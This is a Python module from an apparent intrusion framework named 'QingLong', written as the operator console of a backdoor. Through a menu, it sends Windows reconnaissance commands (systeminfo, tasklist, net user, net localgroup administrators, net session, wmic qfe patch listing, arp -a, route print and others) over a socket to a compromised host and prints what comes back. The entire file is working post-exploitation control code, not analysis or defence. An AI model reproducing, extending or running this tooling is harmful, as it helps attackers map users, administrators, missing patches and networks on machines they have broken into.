import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from AuxiliaryFunctions import MyTable
from prompt_toolkit.history import InMemoryHistory


def General_Information(conn):
    commands = ["back", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Information ~ General Information Query] \033[0m')
    history = InMemoryHistory()
    while True:
        choice = prompt(formatted_text1, completer=completer, history=history)
        if choice.lower() == 'show functions':
            show_functions()
            continue
        elif choice == 'back':
            break
        elif choice == '1':
            print('\033[1;32;32m' + "[+] 查看系统信息:" + '\033[0m')
            command1 = "systeminfo"
            receive(conn, command1)
            print('\033[1;32;32m' + "[+] 系统体系结构:" + '\033[0m')
            command2 = "echo %PROCESSOR_ARCHITECTURE%"
            receive(conn, command2)
        elif choice == '2':
            print('\033[1;32;32m' + "[+] 查看安装的软件及版本、路径等信息:" + '\033[0m')
            command3 = "wmic product get name,version"
            receive(conn, command3)
            print('\033[1;32;32m' + "[+] 收集软件版本信息:" + '\033[0m')
            command4 = "powershell \"Get-WmiObject -class Win32_Product | Select-Object -Property name,version\""
            receive(conn, command4)
        elif choice == '3':
            print('\033[1;32;32m' + "[+] 查询本机服务信息:" + '\033[0m')
            command5 = "wmic service list brief"
            receive(conn, command5)
            print('\033[1;32;32m' + "[+] 查询进程列表:" + '\033[0m')
            command6 = "tasklist"
            receive(conn, command6)
            print('\033[1;32;32m' + "[+] 查看进程信息:" + '\033[0m')
            command7 = "wmic process list brief"
            receive(conn, command7)
            print('\033[1;32;32m' + "[+] 查看启动程序信息:" + '\033[0m')
            command8 = "wmic startup get command,caption"
            receive(conn, command8)
        elif choice == '4':
            print('\033[1;32;32m' + "[+] 查看计划任务:" + '\033[0m')
            command9 = "schtasks /query /fo LIST /v"
            receive(conn, command9)
            print('\033[1;32;32m' + "[+] 查看开机时间:" + '\033[0m')
            command10 = "net statistics workstation"
            receive(conn, command10)
        elif choice == '5':
            print('\033[1;32;32m' + "[+] 查看用户列表:" + '\033[0m')
            command11 = "net user"
            receive(conn, command11)
            print('\033[1;32;32m' + "[+] 获取本地管理员信息(通常包含域用户):" + '\033[0m')
            command12 = "net localgroup administrators"
            receive(conn, command12)
            print('\033[1;32;32m' + "[+] 查看当前在线用户:" + '\033[0m')
            command13 = "query user || qwinsta"
            receive(conn, command13)
            print('\033[1;32;32m' + "[+] 列出或断开本地计算机与所连接的客户端之间的会话:" + '\033[0m')
            command14 = "net session"
            receive(conn, command14)
        elif choice == '6':
            print('\033[1;32;32m' + "[+] 查看已安装的补丁:" + '\033[0m')
            command16 = "wmic qfe get Caption,Description,HotFixID,InstalledOn"
            receive(conn, command16)
        elif choice == '7':
            print('\033[1;32;32m' + "[+] 查询本机共享列表:" + '\033[0m')
            command17 = "net share"
            receive(conn, command17)
        elif choice == '8':
            print('\033[1;32;32m' + "[+] ARP缓存表:" + '\033[0m')
            command18 = "arp -a"
            receive(conn, command18)
        elif choice == '9':
            print('\033[1;32;32m' + "[+] 查询路由表:" + '\033[0m')
            command19 = "route print"
            receive(conn, command19)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break


def show_functions():
    print("\n" + '\033[1;34;34m' + "Domain Information Query" + '\033[0m' + "\n" + '=' * len("Domain Information Query") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model", '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "system information", "系统信息"], ["2", "software information", "软件信息"], ["3", "process information", "进程信息"],
              ["4", "planned task information", "计划任务信息"], ["5", "user information", "用户信息"],
              ["6", "patch information", "补丁信息"], ["7", "sharing information", "共享信息"],
              ["8", "ARP cache table", "ARP缓存表"], ["9", "routing table information", "路由表信息"]]
    MyTable.createTable(headers, mydata)
